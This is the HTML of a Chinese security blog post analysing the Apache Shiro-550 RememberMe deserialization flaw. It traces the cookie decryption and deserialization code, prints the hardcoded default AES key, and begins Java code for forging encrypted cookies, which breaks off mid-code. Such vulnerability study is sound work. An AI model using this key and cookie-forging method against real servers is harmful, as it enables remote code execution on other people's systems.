@@ -1,0 +1,873 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#7732b1">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、环境搭建使用官方的shiro-shiro-root-1.2.4，我是真的搭不出来，不是这错就是那儿错，崩溃！！！ 还是直接下载p神的shirodemo进行环境搭建吧…… 打开项目添加tomcat配置，直接运行即可 二、Shiro-550分析2.1 漏洞原理勾选RememberMe字段，登录成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rem">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro550反序列化漏洞">
+<meta property="og:url" content="http://candyb0x.github.io/2024/12/12/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="一、环境搭建使用官方的shiro-shiro-root-1.2.4，我是真的搭不出来，不是这错就是那儿错，崩溃！！！ 还是直接下载p神的shirodemo进行环境搭建吧…… 打开项目添加tomcat配置，直接运行即可 二、Shiro-550分析2.1 漏洞原理勾选RememberMe字段，登录成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rem">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282159881.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282245453.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282248896.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500769.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282255713.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409291311107.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409291319179.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409292036111.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409292355903.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300009135.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300026034.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500143.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300036363.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459005.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301231515.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301237296.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459714.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301252374.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459428.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301258941.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301518800.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301523981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301525255.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301627442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301628327.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500827.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301947557.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301949792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500612.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302215471.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302214761.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302215439.png">
+<meta property="article:published_time" content="2024-12-12T06:59:27.000Z">
+<meta property="article:modified_time" content="2025-08-17T10:06:29.493Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Shiro">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282159881.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Shiro550反序列化漏洞 - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Shiro550反序列化漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-12 14:59" pubdate>
+          2024年12月12日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Shiro550反序列化漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>使用官方的<code>shiro-shiro-root-1.2.4</code>，我是真的搭不出来，不是这错就是那儿错，崩溃！！！</p>
+<p>还是直接下载p神的<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a>进行环境搭建吧……</p>
+<p>打开项目添加tomcat配置，直接运行即可</p>
+<h1 id="二、Shiro-550分析"><a href="#二、Shiro-550分析" class="headerlink" title="二、Shiro-550分析"></a>二、Shiro-550分析</h1><h2 id="2-1-漏洞原理"><a href="#2-1-漏洞原理" class="headerlink" title="2.1 漏洞原理"></a>2.1 漏洞原理</h2><p>勾选RememberMe字段，登录成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段。<br>之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282159881.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>Shiro1.2.4及之前的版本中，AES加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550）<br>Shiro1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低固定密码泄露的风险。</p>
+<h2 id="2-2-漏洞角度分析Cookie"><a href="#2-2-漏洞角度分析Cookie" class="headerlink" title="2.2 漏洞角度分析Cookie"></a>2.2 漏洞角度分析Cookie</h2><p>从一个漏洞挖掘的角度出发，去看待这个Cooke</p>
+<p>在抓包的情况下，拿到这个Cookie的时候，很明显能够看到这是经过某种加密的。<br>因为在平常的Cookie都是比较短的，而Shiro RememberMe字段的Cookie太长了。</p>
+<p>至此，必须的先知道Cookie的加密过程，如何进行加密？是否可以人为构造Cookie？</p>
+<p>在我们知晓Shiro加密过程之后，可以认为构造而已的Cookie参数，从而能够达到命令执行的目的。</p>
+<h2 id="2-3-逆向分析解密过程"><a href="#2-3-逆向分析解密过程" class="headerlink" title="2.3 逆向分析解密过程"></a>2.3 逆向分析解密过程</h2><p>为了了解详细的Cookie解密过程，通过全局搜索Cookie或remember，主要是在Shiro包里找。</p>
+<p>通过<code>Ctrl + Shift + n</code>全局搜索文件，在其中搜索<code>remember</code>能够看到一些文件；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282245453.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在<code>AbstractRememberMeManager</code>类中，找到一个类似于<strong>硬编码</strong>的密钥；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282248896.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>最后找到相关的类<code>CookieRememberMeManager</code>，其中的<code>getRememberedSerializedIdentity()</code>方法似乎就是解密的其中一步；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500769.png" srcset="/img/loading.gif" lazyload alt="img"><br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282255713.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在该函数当中，首先判断是否为HTTP请求；如果是，则获取其中的Cookie；|<br>然后判断是否为deleteMe，不是则判断是否是base64的编码长度，不符合则对其填充等号，将base64解码的结果返回；</p>
+<p>通过查看<code>getRememberedSerializedIdentity()</code>方法的用法，定位到<code>AbstractRememberMeManager#getRememberedPrincipals()</code>方法调用了<code>getRememberedSerializedIdentity()</code>方法。<br><code>getRememberedPrincipals()</code> 方法的返回类型为 <strong>PrincipalCollection</strong>，一般就是用于聚合多个 Realm 配置的集合。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409291311107.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在393行，将HTTP Requests里面的cookie提取出来，并经过base64解码后赋值给bytes数组；<br>在396行，将bytes数组进行<code>convertBytesToPrincipals()</code>转换，并将值赋值给pricipals变量。</p>
+<p>继续F7跟进到<code>converBytesToPrincipals()</code>方法查看转换的细节<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409291319179.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在该转换方法中明确的做了两件事情，一是解密bytes数组的信息内容；二是反序列化解密后的bytes数组信息；</p>
+<h3 id="2-3-1-decrypt解密"><a href="#2-3-1-decrypt解密" class="headerlink" title="2.3.1 decrypt解密"></a>2.3.1 decrypt解密</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409292036111.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过查看解密方法<code>decrypt()</code>源码；在487行，通过<code>getCipherServer()</code>方法获取加密服务，也就是实现AOP的实现类，在往后489行的<code>decrypt()</code>跟进去，可以知道是一个接口，参数有<code>byte[] encrypted, byte[] decryptionKey</code>。<br>其中第一个<code>encrypted</code>是加密内容数组，第二个<code>decryptionKey</code>是解密密钥，说明这是一个对称加密算法；后续需要重点关注一下这个<code>decryptionKey</code>的内容。</p>
+<p>先简单分析一下<code>getCipherServer()</code>方法获取的加密服务，跟踪一下获取加密服务的获取流程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409292355903.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据上图可知其实使用的加密服务就是AES对称加密，这也就可以直接我们后续使用的密钥<code>decryptionKey</code>如何作用了。</p>
+<p>接下来，继续加密服务调用的<code>decrypt()</code>执行过程，首先分析传进行的参数；<br>形参<code>encrypted</code>数组是经过base64解密的Cookie，第二个参数是AES加密的对称密钥key，通过调用<code>getDecryptionCipherKey()</code>函数获得，查看函数的执行流程。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300009135.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);<br></code></pre></td></tr></table></figure>
+
+<p>最后发现这个传入的key值其实就是我们一开始找Cookie的时候找到的那个类似于硬编码的内容<br>也就是说，Shiro进行Cookie加密的AES算法的密钥就是一个写在代码中的常量，因此我们也可以通过该密钥进行加密构造内容；</p>
+<p>至此，Shiro的decrypt过程已经解析完毕！</p>
+<h3 id="2-3-2-deserialize反序列化"><a href="#2-3-2-deserialize反序列化" class="headerlink" title="2.3.2 deserialize反序列化"></a>2.3.2 deserialize反序列化</h3><p>从之前的<code>convertBytesToPrincipals()</code>方法进入<code>deserialize()</code>方法中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300026034.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以发现在<code>deserialize()</code>中的<code>deserialize</code>方法是一个接口，我们继续跟进<code>Serializer.java</code>中查看相应的实现类有哪些？</p>
+<p>通过鼠标指向<code>deserialize</code>接口，通过快捷键<code>Ctrl+alt+b</code>查看所有的实现类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500143.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以发现存在两个实现类，此时我们需要判断前面的函数<code>getSerializer()</code>获取到的序列化器是哪个类型？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300036363.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过跟踪该方法可以知道<code>getSerializer()</code>返回的是一个<code>DefaultSerializer</code>序列化器，在该序列化器中的<code>deserialize()</code>的实现细节如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459005.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>将输入的信息通过调用<code>readObject()</code>反序列化，这里可以作为很好的入口类。</p>
+<p>至此，Shiro的反序列化过程也分析清楚啦。</p>
+<h2 id="2-4-加密过程"><a href="#2-4-加密过程" class="headerlink" title="2.4 加密过程"></a>2.4 加密过程</h2><p>在分析完毕Cookie的解密和反序列化过程后，我们需要知道Cookie是如何产生的，因此需要进行加密过程的分析。</p>
+<p>首先，定位产生Cookie的位置，必定是在成功登录后才会产生Cookie，所以我们查看相关的方法，最终定位到<code>AbstractRememberMeManager#onSuccessfulLogin()</code>上；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301231515.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这个方法会先忘记认证，即删除前面的认证信息，然后再判断此次成功登录是否勾选<code>RememberMe</code>，从而判断是否调用<code>rememberIdentity(subject, token, info)</code>函数，根据该方法的具体实现；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301237296.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>一步步深入跟进可以发现加密过程与解密过程其实基本上是一致的，进一步进行动态调试查看一下在<code>rememberIdentity()</code>中的principals变量的值是什么内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459981.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过动态调用可以知道，principals中只存储来用户名，但是传入的认证信息<code>AuthenticationInfo</code>却保存了用户名和密码；<br>进一步跟进到<code>convertPrincipalsToBytes()</code>函数<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459714.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以知道这里其实做了两件事，一是将传入的principals进行序列化；二是将序列化后的信息进行加密；传入的principals即是登录的用户名信息；<br>这里的序列化的方式和之前分析反序列化的时候是一样的，通过<code>getSerializer()</code>获取序列化器进行序列化；详细的序列化实现方式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">public byte[] serialize(T o) throws SerializationException &#123;<br>    if (o == null) &#123;<br>        String msg = &quot;argument cannot be null.&quot;;<br>        throw new IllegalArgumentException(msg);<br>    &#125;<br>    ByteArrayOutputStream baos = new ByteArrayOutputStream();<br>    BufferedOutputStream bos = new BufferedOutputStream(baos);<br><br>    try &#123;<br>        ObjectOutputStream oos = new ObjectOutputStream(bos);<br>        oos.writeObject(o);<br>        oos.close();<br>        return baos.toByteArray();<br>    &#125; catch (IOException e) &#123;<br>        String msg = &quot;Unable to serialize object [&quot; + o + &quot;].  &quot; +<br>                &quot;In order for the DefaultSerializer to serialize this object, the [&quot; + o.getClass().getName() + &quot;] &quot; +<br>                &quot;class must implement java.io.Serializable.&quot;;<br>        throw new SerializationException(msg, e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来我们分析一下加密方法<code>encrypt()</code>，跟进到方法的具体实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301252374.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以发现这里的加密方式与加密方式也是如出一辙的，包括获取密钥key的方式。如果在解密的时候，注意一下，就会发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">public void setCipherKey(byte[] cipherKey) &#123;<br>        //Since this method should only be used in symmetric ciphers<br>        //(where the enc and dec keys are the same), set it on both:<br>        setEncryptionCipherKey(cipherKey);<br>        setDecryptionCipherKey(cipherKey);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里同时设置了两个密钥为统一默认密钥；<br>获取加密服务的方法<code>getCipherService()</code>与解密的地方也是一致的无需进一步分析；</p>
+<p>通过F8一步一步执行回到<code>rememberIdentity()</code>中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121459428.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对<code>rememberSerializedIdentity()</code>进行F7深入查看实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301258941.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发现该方法就是设置Cookie的方法。首先，判断是否为HTTP请求，不是则直接报错跳出；若是，则将加密后的信息在进行base64编码然后再设置为Cookie值；</p>
+<h1 id="三、Shiro-550漏洞利用"><a href="#三、Shiro-550漏洞利用" class="headerlink" title="三、Shiro-550漏洞利用"></a>三、Shiro-550漏洞利用</h1><p>如果我们需要RCE或者反弹shell，那就需要利用到反序列化，反序列化的信息能够由我们来控制；<br>在此前的分析我们可以知道，只需将我们需要反序列化的内容经过一系列的加密后替换数据包中的RememberMe的内容，即可实现任意内容反序列化。</p>
+<h2 id="3-1-加密自定义信息"><a href="#3-1-加密自定义信息" class="headerlink" title="3.1 加密自定义信息"></a>3.1 加密自定义信息</h2><p>说实话，这里虽然我们知道加密是通过AES进行加密的，但是其中还有有非常多的细节需要注意的，最后才能进行同样的加密；</p>
+<p>可以通过两种方式去实现该加密，一是直接使用Java通过导入同样的类，调用同样的方法去实现相同的加密；二是分析加密原理，使用python设置同样的加密模式、填充模式、生成随机化的初始向量进行加密；</p>
+<h3 id="3-1-1-Java实现"><a href="#3-1-1-Java实现" class="headerlink" title="3.1.1 Java实现"></a>3.1.1 Java实现</h3><p>通过Java实现相对来说比较简单，因为只需要调用相同的包即可，不需要关注加密算法的具体实现细节；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> shirodemo</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.AES_Enc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/30 14:37</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AES_Enc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// data: 需要加密的数据内容</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">byte</span>[] dataBytes = data.getBytes();<br><br>        <span class="hljs-type">byte</span>[] key = 